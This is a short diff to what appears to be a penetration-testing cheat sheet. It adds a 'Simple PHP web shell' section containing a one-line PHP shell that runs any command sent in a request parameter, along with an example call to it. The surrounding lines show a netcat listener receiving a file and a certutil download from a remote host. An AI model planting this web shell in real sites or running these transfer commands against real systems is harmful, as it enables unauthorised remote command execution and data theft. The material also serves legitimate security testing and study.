@@ -177,7 +177,11 @@ nc -lp 8888 > outfile
 ```
 certutil.exe -urlcache -split -f "$RHOST" outfile.zip
 ```
-
+## Simple PHP web shell
+```
+<?php system($_REQUEST['cmd']); ?>
+xxx.php?cmd=whoami
+```
 
 ## Reverse Shell
 ### PHP
